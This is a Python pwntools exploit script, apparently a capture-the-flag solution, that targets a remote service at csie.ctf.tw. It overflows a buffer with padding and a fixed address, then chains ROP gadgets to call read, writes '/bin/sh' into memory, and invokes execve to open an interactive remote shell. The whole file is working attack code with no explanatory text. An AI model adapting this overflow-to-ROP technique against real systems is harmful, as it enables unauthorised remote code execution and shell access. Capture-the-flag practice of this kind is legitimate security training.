#!/usr/bin/python
from pwn import *

host = 'csie.ctf.tw'
port = 10128
#host = 'localhost'
#port = 4000
context.arch = 'amd64'
r = remote(host, port)
raw_input('#')
r.recvuntil('\n')
sending = 'aaaaaaaabbbbbbbbccccccccddddddddeeeeeeeeffffffffgggggggghhhhhhhhiiiiiiiijjjjjjjjkkkkkkkkllllllllmmmmmmmmnnnnnnnnooooooooppppppppqqqqqqqq' + p64(0x52b000) + ' ' + '\x00'*7
sending = sending.ljust(328, 'a')
print ('sending : ', sending)

pop_rax = 0x0000000000404971
pop_rsi = 0x00000000004072e7
pop_rdi = 0x000000000042ed2d
syscall = 0x000000000044f609
pop_rdx = 0x0000000000447b0f
pop_rcx = 0x0000000000414316

buf = 0x0053f000 - 0x100


rop = flat([pop_rax, buf, pop_rdi, 0, pop_rsi, buf, pop_rdx, 9, pop_rax, 0, syscall, pop_rax, buf-0x100, pop_rdi, buf, pop_rsi, 0, pop_rdx, 0, pop_rax, 0x3b, pop_rcx, 0, syscall])
sending += rop



r.sendline(sending)
r.recvuntil(':')
r.sendline('b')
r.recvuntil(':')
r.sendline('/bin/sh\x00')
r.interactive()
# 0x0052b000
